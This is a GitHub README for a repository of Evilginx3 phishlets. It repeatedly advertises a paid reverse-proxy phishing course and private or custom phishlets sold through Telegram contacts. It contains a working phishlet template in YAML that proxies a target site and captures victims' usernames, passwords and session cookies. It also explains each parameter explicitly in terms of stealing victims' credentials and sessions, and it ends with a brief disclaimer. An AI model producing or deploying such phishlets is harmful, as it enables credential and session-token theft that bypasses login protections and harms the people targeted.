# Updated Evilginx3 Phishlets        
I've dedicated substantial time and effort to create and update new phishlets for Evilginx3. 
In this repository, you'll find many custom Evilginx phishlets, finely crafted and updated to suit real-world applications.
      
         
# FOR [Advanced EvilGoPhish Mastery Course] CONTACT IN MY TELEGRAM  -  https://t.me/hidden9090           
 
                                                  
   
If not replying you than  I'm busy in that case , please    
Text my team   
(https://t.me/hidden9090team)
    
        

This is a course for the advanced hackers, red teams, and penetration testers looking to gain an edge in today's security environment.   
Learn advanced phishing & smishing techniques with EvilGoPhish 3.0, one of the most powerful reverse-proxy phishing tools available.

EvilGoPhish Mastery is *bar none* the most dynamic and nuanced reverse-proxy phishing course on the market.

The course works in tandem with this repo by diving deep into the entire process of deploying these scripts for red team phishing & smishing campaigns.

 

# Curriculum Previews:

![Screenshot 2024-06-01 064917](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/f506630f-06ff-4285-9c09-26fbcf57a588)
![evilgophish 3 0 course preview release setup section trailer](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/9be0b731-6934-4d52-ba7c-becb43141a96)
![Evilgophish mastery course cloudflare turnstile lesson preview www simplerhacking](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/0c22ecc6-9b6d-44c0-bf3f-e8624ecbd917)

![Screenshot 2024-06-01 044437](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/6a295035-e41a-4c9a-956a-c0366129088c)



![EvilGoPhish Mastery Curriculum Preview from Simpler Hacking (1)](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/cb043987-2315-47dc-abf6-9e508d7c1128)

![EvilGoPhish Mastery Curriculum Preview from Simpler Hacking (2)](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/6a3dd41e-72b4-4701-9675-53f8c765a246)

![(Smaller 8 MB for Github) evilgophish kuba graphic in moving format and gif short 8 second loop](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/cba899aa-e100-4af9-b621-f5dce14b2786)




## Need Custom Phishlets? 
MY TELEGRAM  -  https://t.me/hidden9090


If not replying you than  I'm busy in that case , please 
Text my team 
(https://t.me/hidden9090team)


##

## Simpler Hacking Evilginx Phishlet Template (Use this template to make your own!)

```yaml
name: 'Your First Phishlet'
author: 'Simpler Hacking'
min_ver: '3.2.0'

proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

auth_tokens:
  - domain: '{domain}'
    keys: ['session']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

login:
  username: user
  password: pass
  url: https://www.{domain}/login

# This is just a demo example of a phishlet for 3.2.0


```

CONTACT :- MY TELEGRAM - https://t.me/hidden9090



**Explanation of Phishlet Parameters:**

- `name:` Identifies the name of the phishlet.
- `author:` Specifies the phishlet author.
- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.



## Want more Evilginx Phishlets not available on Github? 
Gain access to more private Phishlets not available to the public Contact me  -  https://t.me/hidden9090

If not replying you than  I'm busy in that case , please 
Text my team 
(https://t.me/hidden9090team)



<img width="264" alt="Patreon" src="https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/3e9d587d-0792-4dad-a6d2-aaa004197508">



### Enroll in our training lessons            

CONTACT :-
MY TELEGRAM  -  https://t.me/hidden9090

If not replying you than  I'm busy in that case , please 
Text my team 
(https://t.me/hidden9090team)

## Disclaimer
The tools here are intended solely for legal and ethical use by cybersecurity professionals in controlled environments. 
Any illegal or malicious use is strictly prohibited.
I disclaim all responsibility for any harm, loss, or damage that may arise from improper use.


https://t.me/+1tDzjSCGDDs0ODA9
